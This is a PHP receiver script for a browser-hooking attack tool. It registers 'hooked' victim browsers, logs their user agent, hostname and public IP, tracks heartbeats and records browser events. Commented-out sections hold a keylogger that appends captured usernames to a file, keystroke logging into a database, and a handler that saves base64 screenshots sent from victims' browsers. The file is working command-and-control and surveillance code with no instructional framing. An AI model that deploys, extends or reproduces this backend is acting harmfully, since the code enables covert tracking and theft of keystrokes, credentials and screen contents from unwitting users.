<?php
    include_once('inc/rcv_wip.inc.php');

    // New hooked browser
    // Create new row in db if new hooked brower
    if(isset($_GET['action']) && $_GET['action'] == 'initHook') {
        initHook($_GET['browserId'], $_GET['userAgent'], $_GET['hostname']);        
    }

    if(isset($_GET['action']) && $_GET['action'] === 'heartbeat') {
        heartbeat($_GET['browserId']);
    }

    if(isset($_GET['action']) && $_GET['action'] === 'getPublicIP') {
        getPublicIP($_GET['browserId'], $_GET['publicIP']);
    }

    if(isset($_GET['eventType']) && !empty($_GET['eventType'])) {
        addEvent($_GET['browserId'], $_GET['eventType'], $_GET['event']);
    }


    /*

            switch ($_GET['eventType']) {
            event_onclick($_GET['browserId'], $_GET['eventType'], $_GET['event']);
            case "onclick":
                
                break;

            case "onfocus":
                event_onclick($_GET['browserId'], $_GET['eventType'], $_GET['event']);
                break;

            case "onblur":
                event_onclick($_GET['browserId'], $_GET['eventType'], $_GET['event']);
                break;
        }        

        */
    /*
    if(isset($_GET['action']) && $_GET['action'] === 'keystroke') {
        if(isset($_GET['browserId']) && !empty($_GET['browserId'])) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, event_type, event) VALUES (NOW(), ?, ?, ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("sss", $_GET['browserId'], $_GET['action'], $_GET['keys'])) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }*/

/*
    if(isset($_GET['username'])) {
        $keylogger = $_GET['username'];
        $file = "keylogger.txt";
        file_put_contents($file, $keylogger, FILE_APPEND | LOCK_EX);
    }

    if(isset($_POST['screen'])) {
        $data = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['screen']));
        //file_put_contents('image.png', $data, FILE_APPEND | LOCK_EX);
        $file = fopen('image.png', "wb");
        fwrite($file, $data);
        fclose($file);
    }   */ 
?>